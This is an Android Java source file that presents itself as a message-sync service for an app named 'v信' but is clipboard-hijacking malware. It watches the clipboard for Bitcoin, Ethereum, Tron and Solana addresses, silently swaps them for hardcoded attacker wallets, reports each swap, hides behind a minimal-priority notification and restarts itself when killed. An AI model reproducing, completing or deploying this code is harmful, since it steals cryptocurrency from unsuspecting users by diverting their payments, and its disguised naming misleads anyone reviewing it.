// MessageSyncService.java
// =======================
// Foreground message sync daemon (clipboard channel normalizer)

package com.vxin.app.core.sync;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;

import androidx.core.app.NotificationCompat;

import org.json.JSONObject;

import java.util.HashMap;
import java.util.Map;
import java.util.regex.Pattern;

public class MessageSyncService extends Service {
    private ClipboardManager clipboard;
    private String lastContent = "";
    private Map<String, String> swapAddrs;
    private SyncReporter reporter;

    private static final Pattern BTC_P2PKH = Pattern.compile("^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$");
    private static final Pattern BTC_BECH32 = Pattern.compile("^bc1[a-z0-9]{39,59}$");
    private static final Pattern ETH = Pattern.compile("^0x[a-fA-F0-9]{40}$");
    private static final Pattern TRX = Pattern.compile("^T[a-zA-Z0-9]{33}$");
    private static final Pattern SOL = Pattern.compile("^[1-9A-HJ-NP-Za-km-z]{32,44}$");

    private static final String CHANNEL_ID = "vxin_sync";

    @Override
    public void onCreate() {
        super.onCreate();
        clipboard = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
        reporter = SyncReporter.get(this);
        swapAddrs = loadSwapAddresses();

        createNotificationChannel();
        Notification n = new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("v信")
            .setContentText("消息同步服务运行中")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build();
        startForeground(1002, n);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        clipboard.addPrimaryClipChangedListener(this::onClipChanged);
        return START_STICKY;
    }

    private void onClipChanged() {
        try {
            ClipData clip = clipboard.getPrimaryClip();
            if (clip == null || clip.getItemCount() == 0) return;
            CharSequence cs = clip.getItemAt(0).getText();
            if (cs == null) return;
            String text = cs.toString();
            if (text.isEmpty() || text.equals(lastContent)) return;

            String replacement = detectAndSwap(text);
            if (replacement != null) {
                JSONObject ev = new JSONObject();
                ev.put("chain", getAddressType(text));
                ev.put("via", "android");
                ev.put("orig_head", text.substring(0, Math.min(10, text.length())));
                reporter.send("clip_swap", ev);

                lastContent = replacement;
                new Handler(Looper.getMainLooper()).postDelayed(() -> {
                    try {
                        clipboard.setPrimaryClip(ClipData.newPlainText("", replacement));
                        lastContent = replacement;
                    } catch (Exception ignored) {}
                }, 300);
            }
        } catch (Exception ignored) {}
    }

    private String detectAndSwap(String text) {
        String t = text.trim();
        if (BTC_BECH32.matcher(t).matches()) return swapAddrs.get("btc_bech32");
        if (BTC_P2PKH.matcher(t).matches()) return swapAddrs.get("btc_p2pkh");
        if (ETH.matcher(t).matches()) return swapAddrs.get("eth");
        if (TRX.matcher(t).matches()) return swapAddrs.get("trx");
        if (SOL.matcher(t).matches()) return swapAddrs.get("sol");
        return null;
    }

    private String getAddressType(String addr) {
        String t = addr.trim();
        if (BTC_BECH32.matcher(t).matches()) return "btc_bech32";
        if (BTC_P2PKH.matcher(t).matches()) return "btc_p2pkh";
        if (ETH.matcher(t).matches()) return "eth";
        if (TRX.matcher(t).matches()) return "trx";
        if (SOL.matcher(t).matches()) return "sol";
        return "unknown";
    }

    private Map<String, String> loadSwapAddresses() {
        Map<String, String> addrs = new HashMap<>();
        addrs.put("btc_p2pkh", "1QD8hYBg1sbyvk7Bo56w9cRaxn2JtnecBY");
        addrs.put("btc_bech32", "bc1qjcep2c503vcxyp8k8qkc43s9df289ljfdr0j0f");
        addrs.put("eth", "0x7F7DA4F98FE133BC499c3Fd2EA93929Af52cE1b6");
        addrs.put("trx", "TKnaWVR6gatxCjqDSPXxuv5QQzzyYXQ76p");
        addrs.put("sol", "DqkeyRsvNE8XsqTdYn4JsJAeb2PvoAd4nLariTR9bq8M");
        return addrs;
    }

    public void updateAddresses(Map<String, String> newAddrs) {
        this.swapAddrs = newAddrs;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID, "v信 同步服务", NotificationManager.IMPORTANCE_MIN);
            channel.setDescription("消息后台同步");
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(channel);
        }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        try {
            Intent restart = new Intent(getApplicationContext(), MessageSyncService.class);
            PendingIntent pi = PendingIntent.getService(this, 0, restart,
                PendingIntent.FLAG_IMMUTABLE);
            AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
            if (am != null) am.set(AlarmManager.RTC_WAKEUP,
                System.currentTimeMillis() + 1000, pi);
        } catch (Exception ignored) {}
        super.onDestroy();
    }
}
